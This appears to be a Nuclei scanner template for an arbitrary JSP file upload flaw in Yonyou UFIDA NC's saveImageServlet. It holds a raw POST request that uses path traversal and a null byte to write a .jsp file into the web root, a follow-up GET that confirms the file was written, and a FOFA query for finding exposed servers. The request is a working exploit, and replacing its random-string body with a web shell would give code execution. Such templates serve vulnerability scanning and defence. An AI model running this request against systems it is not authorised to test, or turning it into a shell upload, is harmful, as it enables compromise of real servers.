id: yonyou-nc-saveImageServlet-fileupload

info:
  name: 用友 UFIDA NC saveImageServlet/doPost - fileupload
  author: leadlife
  severity: critical
  description:
  reference:
    - todo
  metadata:
    verified: true
    fofa-qeury: icon_hash="1085941792" || app="用友-UFIDA-NC"
  tags: yonyou,nc,fileupload,oa

variables:
  num: '{{rand_int(800000000, 1000000000)}}'

http:
  - raw:
      - |
        POST /portal/pt/servlet/saveImageServlet/doPost?pageId=login&filename=../{{num}}.jsp%00 HTTP/1.1
        Host: {{Hostname}} 
        Content-Type: application/octet-stream
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
        Content-Length: 19

        {{randstr}}
      
      - |
        GET /portal/processxml/{{num}}.jsp HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36
           
    matchers:
      - type: dsl
        dsl:
          - "status_code_1 == 200 && status_code_2 == 200"
          - "contains(body_2,'{{randstr}}')"
        condition: and